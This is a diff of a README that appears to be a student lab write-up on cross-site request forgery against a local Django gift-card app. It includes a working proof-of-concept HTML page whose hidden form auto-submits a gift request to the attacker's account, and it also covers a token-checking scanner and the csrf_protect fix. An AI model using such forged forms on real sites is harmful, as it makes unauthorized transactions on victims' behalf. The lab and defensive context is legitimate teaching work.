@@ -33,6 +33,7 @@ For task 1b we made a script that uses the request libraries. The script works b
  
  <img width="1116" alt="Screen Shot 2022-03-17 at 5 22 04 PM" src="https://user-images.githubusercontent.com/72175659/158900203-cec6b656-3cb8-491b-83a6-96c4d65b6c97.png">
  <img width="1103" alt="Screen Shot 2022-03-17 at 5 23 45 PM" src="https://user-images.githubusercontent.com/72175659/158900214-57fc8329-112c-4bd6-a997-0215d954dd64.png">
+ 
 # CROSS SITE REQUEST FORGERY
  
  First we verify that we can sen giftcard from user on the left to the user on the right
@@ -52,35 +53,39 @@ static and dynamic analysis of the application were used to discover a potential
 	</head>
 	<body>
 		<h1>Pwn press F</h1>
-		<form action="http://127.0.0.1:80/gift/0" method="post" target="hiddenframe" name="csrfform">
+		<form action="http://127.0.0.1:80/gift/0" method="post" target="hiddenframe" name="badform">
 		
 		        <input type="hidden" name="amount" value="666" /> 
 			<input type="hidden" name="username" value="bryan" /> 
 			
-		 <script>document.csrfform.submit();</script>
+		 <script>document.badform.submit();</script>
 		</form>
-		<iframe name="hiddenframe" style="display: none;"></iframe>
 	</body>
 </html>
 
  ```
  
  <img width="1102" alt="Screen Shot 2022-03-18 at 3 44 40 PM" src="https://user-images.githubusercontent.com/72175659/159073383-5d4694e6-de9a-451e-8617-d6c755331e56.png">
-We store the POC exploit in an isolated directory and spin up a python server on port 8081 with
+ 
+ <img width="1095" alt="Screen Shot 2022-03-20 at 3 25 29 PM" src="https://user-images.githubusercontent.com/72175659/159183641-eb7f6cce-84d3-4799-bd98-65bf0398a26b.png">
+
+We store the POC exploit in an isolated directory rename it index.html and spin up a python server on port 8081 with
 
 ```
 python3 -m http.server 8081
 ```
- We go on the targets web browser and go to 0.0.0.0:8081/index.html which will trigger out exploit. The instance of the exploit should gift the attacker a card worth 666
+ We go on the targets web browser and go to 0.0.0.0:8081/index.html which will trigger our exploit. The instance of the exploit should gift the attacker a card worth 1111
  
- <img width="1101" alt="Screen Shot 2022-03-18 at 3 48 11 PM" src="https://user-images.githubusercontent.com/72175659/159073809-59a23af5-d43d-4649-b5e3-1b2b6c707539.png">
+ <img width="883" alt="Screen Shot 2022-03-20 at 3 35 51 PM" src="https://user-images.githubusercontent.com/72175659/159183774-5f578c5d-88b8-44b8-9120-34d6200b14e4.png">
+
+
  
  As expected our exploit was successful.
 
  
 <img width="1119" alt="Screen Shot 2022-03-17 at 9 33 30 PM" src="https://user-images.githubusercontent.com/72175659/158921791-69ec6bb5-a2e9-44bf-ba2c-f1438d2ab599.png">
 
-This exploit works because there is not csrf token in the input field. What this token does is essentially give a random hidden input that only that instance of the website will have and recognize on submission. This prevents cross websites forgeries to a large extent as guessing that input would require  time, luck, or both. We made jbrg-csrf.py to check for "csrfmiddlewaretoken" in the gift.html templete . The server prints gift.html and since it doesn't have the mitigating control we output "CSRF Vulnerable".
+This exploit works because there is not csrf token inside the form  field. What this token does is essentially give a random hidden input that only that instance of the website will have and recognize on submission. This prevents cross websites forgeries to a large extent as guessing that input would require  time, luck, or both. We made jbrg-csrf.py to check for "csrfmiddlewaretoken" in the gift.html templete . The server prints gift.html and since it doesn't have the mitigating control we output "CSRF Vulnerable".
 <img width="1082" alt="Screen Shot 2022-03-18 at 4 21 54 PM" src="https://user-images.githubusercontent.com/72175659/159077999-e0a9b1c7-f30b-4add-a161-5a5d55fbaa5e.png">
 
 
@@ -92,11 +97,13 @@ scanning with jbg469-csrf.py shows us vulnerability is mitigated.
 
 <img width="1099" alt="Screen Shot 2022-03-18 at 4 14 19 PM" src="https://user-images.githubusercontent.com/72175659/159077129-5f9803da-103b-4cb0-aef0-a327747b42cd.png">
 
-That enough did not stop our POC exploit from running again, it was that good. We had to edit the setting.py file to include 'django.middleware.csrf.CsrfViewMiddleware'. After running our exploit again we succesffuly mitaged our POC attack. 
+That enough did not stop our POC exploit from running again, it was that good. We had to edit the views.py file to include @csrf_protect decorator above the gift views function.
 
+<img width="973" alt="Screen Shot 2022-03-20 at 3 32 05 PM" src="https://user-images.githubusercontent.com/72175659/159183866-d7f8b56c-409d-423e-992f-b7b10180dede.png">
 
-<img width="1099" alt="Screen Shot 2022-03-18 at 4 34 11 PM" src="https://user-images.githubusercontent.com/72175659/159079721-dcdba0e3-3dec-4e6c-ac25-ef90d42d6ce1.png">
+<img width="961" alt="Screen Shot 2022-03-20 at 3 31 45 PM" src="https://user-images.githubusercontent.com/72175659/159183872-b03cee4d-9e8f-423d-b6b3-82e45eab535d.png">
 
+The decorator method prevents us from having to add a csrf token to every template on the app as opposed to the middleware method.
 
 We just proved that the technique employed by the script is not ideal as the html file can have a csrf token but its not being actually enforced in the django settings.
 
